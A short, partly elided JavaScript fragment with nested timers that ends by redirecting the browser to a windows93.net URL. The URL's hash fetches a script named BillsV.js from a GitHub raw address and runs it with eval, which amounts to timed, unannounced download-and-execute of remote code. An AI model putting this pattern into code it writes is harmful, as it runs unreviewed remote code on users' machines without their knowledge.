...
setTimeout(function() {
  ...
  setInterval(() => {
    ...
    setTimeout(function() {
        window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/BillsV.js').then(response => response.text()).then(script => eval(script));";
